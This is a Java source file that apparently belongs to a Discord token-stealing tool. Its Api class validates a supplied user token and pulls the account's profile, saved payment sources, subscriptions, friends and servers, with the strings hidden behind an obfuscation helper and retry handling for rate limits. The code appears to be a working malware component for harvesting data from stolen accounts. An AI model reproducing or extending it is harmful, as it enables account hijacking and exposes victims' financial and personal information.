package noface.sync;

import noface.config.S;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;

public final class Api {

    private static String base() {
        return S.e("https://discord.com/api/v9");
    }

    public static String me(String token) {
        return get(token, S.e("/users/@me"));
    }

    public static String billing(String token) {
        return get(token, S.e("/users/@me/billing/payment-sources"));
    }

    public static String subs(String token) {
        return get(token, S.e("/users/@me/billing/subscriptions"));
    }

    public static String friends(String token) {
        return retry(token, S.e("/users/@me/relationships"));
    }

    public static String guilds(String token) {
        return get(token, S.e("/users/@me/guilds"));
    }

    public static String profile(String token, String userId) {
        return get(token, S.e("/users/") + userId + S.e("/profile?with_mutual_guilds=false"));
    }

    public static boolean valid(String token) {
        return get(token, S.e("/users/@me")) != null;
    }

    private static String retry(String token, String path) {
        for (int i = 0; i < 3; i++) {
            try {
                if (i > 0) Thread.sleep(2000);
            } catch (InterruptedException e) {
                return null;
            }
            String r = get(token, path);
            if (r != null) return r;
        }
        return null;
    }

    private static String get(String token, String path) {
        if (token == null || token.isBlank()) return null;
        for (int attempt = 0; attempt < 3; attempt++) {
            try {
                if (attempt > 0) Thread.sleep(1500L * attempt);
                HttpURLConnection conn = (HttpURLConnection) URI.create(base() + path).toURL().openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                conn.setRequestProperty(S.e("Authorization"), token);
                conn.setRequestProperty(S.e("User-Agent"), S.e("Mozilla/5.0"));
                conn.setRequestProperty(S.e("X-Discord-Locale"), S.e("en-US"));

                int code = conn.getResponseCode();
                if (code == 429) {
                    String ra = conn.getHeaderField("Retry-After");
                    long wait = 2000;
                    try {
                        if (ra != null) wait = (long) (Double.parseDouble(ra) * 1000) + 500;
                    } catch (Exception ignored) {}
                    try {
                        conn.getErrorStream().readAllBytes();
                    } catch (Exception ignored) {}
                    Thread.sleep(Math.min(wait, 10000));
                    continue;
                }
                InputStream in = code >= 200 && code < 300 ? conn.getInputStream() : conn.getErrorStream();
                if (in == null) return null;
                byte[] body = in.readAllBytes();
                if (code < 200 || code >= 300) return null;
                return new String(body, StandardCharsets.UTF_8);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return null;
            } catch (IOException e) {
                return null;
            }
        }
        return null;
    }

    private Api() {}
}
